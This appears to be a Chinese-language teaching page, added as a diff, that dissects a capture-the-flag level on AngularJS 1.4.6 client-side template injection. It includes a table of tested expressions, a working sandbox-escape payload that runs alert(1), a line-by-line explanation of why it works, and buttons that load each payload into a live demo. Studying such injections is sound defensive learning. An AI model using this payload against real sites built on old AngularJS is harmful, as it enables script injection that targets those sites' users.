@@ -1,0 +1,139 @@
+<!doctype html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<title>level6 拆解：AngularJS 模板注入（CSTI）</title>
+<style>
+  body { font-family: -apple-system, "Segoe UI", "Microsoft YaHei", sans-serif;
+         max-width: 940px; margin: 24px auto; padding: 0 16px; line-height: 1.75; }
+  code, pre, input { font-family: Consolas, monospace; }
+  .box { border: 1px solid #ddd; border-radius: 8px; padding: 12px 18px; margin: 18px 0; }
+  .hint { color: #666; font-size: 13px; }
+  pre { background: #f6f6f6; padding: 10px; border-radius: 6px; overflow-x: auto; }
+  button { padding: 5px 10px; cursor: pointer; margin: 3px 4px 3px 0; font-size: 13px; }
+  #render { border: 1px dashed #bbb; padding: 10px; border-radius: 6px; background: #fafafa; }
+  table { border-collapse: collapse; width: 100%; font-size: 13px; }
+  th, td { border: 1px solid #ddd; padding: 6px 8px; text-align: left; vertical-align: top; }
+  th { background: #f2f2f2; }
+  .ok { color: #0a7d32; font-weight: 600; }
+  .bad { color: #b3261e; font-weight: 600; }
+</style>
+</head>
+<body>
+
+<h2>level6 拆解：AngularJS 模板注入</h2>
+<p class="hint">页面从 CDN 加载 AngularJS 1.4.6（和原题同一个地址），断网时不生效。</p>
+
+<div class="box">
+  <h3>① 服务端返回的 HTML 长这样</h3>
+<pre><code>&lt;div id="root" ng-app=""&gt;
+    ...
+    &lt;span class="a-TplField"&gt;welcome {{7*7}}&lt;/span&gt;
+&lt;/div&gt;</code></pre>
+  <p>注意两件事：</p>
+  <ul>
+    <li>服务端把 <code>&lt;</code> 转义成了 <code>&amp;#x3c;</code>（所以 <code>&lt;script&gt;</code>、<code>&lt;img&gt;</code> 全废）</li>
+    <li><code>ng-app</code> 存在 → 这块 DOM 归 Angular 管；而 <code>{{ }}</code> <b>原样保留</b></li>
+  </ul>
+  <p>下面这个 <code>span</code> 里就是 <code>welcome {{7*7}}</code>，Angular 已接管，你看到的是：</p>
+  <div id="render">
+    <div id="app"><span id="target">welcome {{7*7}}</span></div>
+  </div>
+  <p class="hint">如果显示 <b>welcome 49</b>，说明你的输入被当成了<b>表达式</b>求值，而不是被当成文本显示。</p>
+</div>
+
+<div class="box">
+  <h3>② 换成你自己的 payload 点一下试试</h3>
+  <p>
+    <input id="p" size="60" value="{{7*7}}">
+    <button onclick="load()">用这个重新加载</button>
+  </p>
+  <div id="presets"></div>
+  <p class="hint">点按钮 → 把 payload 拼进 URL 的 <code>?p=</code> → 重新加载 → 页面把它塞进 DOM 后由 Angular 编译。
+     跟原题"服务端渲染完 HTML，前端 Angular 再编译"的顺序一致。</p>
+</div>
+
+<div class="box">
+  <h3>③ 在真实的 Angular 1.4.6 上跑出来的结果</h3>
+  <table>
+    <tr><th>表达式</th><th>结果</th><th>说明</th></tr>
+    <tr><td><code>{{7*7}}</code></td><td class="ok">显示 49</td><td>表达式被执行了</td></tr>
+    <tr><td><code>{{'x'+'y'}}</code></td><td class="ok">显示 xy</td><td>能算，能拼字符串</td></tr>
+    <tr><td><code>{{$eval('1+1')}}</code></td><td class="ok">显示 2</td><td><code>$eval</code> 可访问 —— 这是"表达式里还能再求值一段字符串"的后门</td></tr>
+    <tr><td><code>{{$eval('alert(1)')}}</code></td><td class="bad">报错 s.alert is not a function</td><td>表达式里的标识符走 <code>scope</code>，摸不到全局 <code>alert</code></td></tr>
+    <tr><td><code>{{constructor.constructor('alert(1)')()}}</code></td><td class="bad">报错 $parse:isecfn</td><td>1.4.6 的沙箱直接拦"引用 Function"，这是 1.6+ 才通用的 payload</td></tr>
+    <tr><td><code>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}</code></td><td class="ok">真的弹窗</td><td>破坏沙箱 + 二次求值，才能落到"原始 JS"</td></tr>
+  </table>
+</div>
+
+<div class="box">
+  <h3>④ 为什么那串"咒语"要这么长</h3>
+  <p>拆成三段看：</p>
+<pre><code>{{ 'a'.constructor.prototype.charAt = [].join ;     // ① 把 String 的 charAt 换成 Array 的 join
+    $eval('x=1} } };alert(1)//') ; }}                 // ② 交一段字符串给 $eval 二次求值
+                                                       //    里面用 } } } 跳出 Angular 生成的函数体</code></pre>
+  <table>
+    <tr><th>只做①</th><td class="bad">失败</td><td><code>{{'a'.constructor.prototype.charAt=[].join;$eval('alert(1)')}}</code> → 报 <code>s.alert is not a function</code>（还是走 scope）</td></tr>
+    <tr><th>只做②</th><td class="bad">失败</td><td>Angular 的表达式解析器遇到 <code>}</code> 直接报语法错误，字符串根本进不去编译</td></tr>
+    <tr><th>①②一起</th><td class="ok">成功</td><td>①把编译器内部搞坏（会看到 <code>TypeError: Cannot set properties of undefined (setting 'literal')</code>），②的尾巴被当成<b>原始 JS</b> 拼进生成函数的 body，于是 <code>alert</code> 是全局的</td></tr>
+  </table>
+  <p class="hint">所以那串东西不是随便写的谜语，是"先砸坏保安，再从后门进"。
+     失败时看到的报错，恰恰是它起作用的证据。</p>
+</div>
+
+<div class="box">
+  <h3>⑤ 这关真正的教训</h3>
+  <ul>
+    <li><b>HTML 转义只防 HTML。</b><code>{</code> <code>}</code> 不是 HTML 特殊字符，转义规则里没它们，所以原样进了模板引擎。</li>
+    <li><b>模板引擎会"主动执行"你的字符串。</b>这不是拼接注入，是框架自己把数据当代码——叫 CSTI（客户端模板注入）。</li>
+    <li><b>同一个"框架 + 用户输入"的组合，在服务端就是 SSTI</b>（Jinja2、Twig、Freemarker），本质一模一样。</li>
+    <li><b>框架版本旧 = 自带沙箱也靠不住。</b>1.4.6 是 2015 年的版本，沙箱早被公开绕过；1.6 干脆把沙箱删了（"不是安全边界"）。</li>
+  </ul>
+</div>
+
+<script>
+/* 预设 payload，用 data 数组生成按钮，避免内联引号地狱 */
+var PRESETS = [
+  ['算数 7*7', '{{7*7}}'],
+  ['字符串拼接', "{{'x'+'y'}}"],
+  ['$eval 二次求值 1+1', "{{$eval('1+1')}}"],
+  ['$eval 里直接调 alert（失败）', "{{$eval('alert(1)')}}"],
+  ['1.6+ 通用 payload（这里被沙箱拦）', "{{constructor.constructor('alert(1)')()}}"],
+  ['1.4.6 逃逸 payload（会弹窗）', "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}"]
+];
+
+(function buildPresets() {
+  var box = document.getElementById('presets');
+  PRESETS.forEach(function (item) {
+    var b = document.createElement('button');
+    b.textContent = item[0];
+    b.title = item[1];
+    b.onclick = function () { document.getElementById('p').value = item[1]; load(); };
+    box.appendChild(b);
+  });
+})();
+
+function load() {
+  location.search = '?p=' + encodeURIComponent(document.getElementById('p').value);
+}
+
+(function boot() {
+  var params = new URLSearchParams(location.search);
+  var p = params.get('p');
+  var target = document.getElementById('target');
+
+  // 模拟"服务端已经把内容渲染进 HTML"：这里用 textContent 等价于服务端把 < 转义成 &#x3c; 后的解析结果
+  if (p !== null) target.textContent = 'welcome ' + p;
+
+  // 模拟页面里的 ng-app
+  document.getElementById('app').setAttribute('ng-app', '');
+
+  // 模拟页面最后加载 angular.js（原题从 cdn 引入 1.4.6）
+  var s = document.createElement('script');
+  s.src = 'https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js';
+  document.body.appendChild(s);
+})();
+</script>
+
+</body>
+</html>
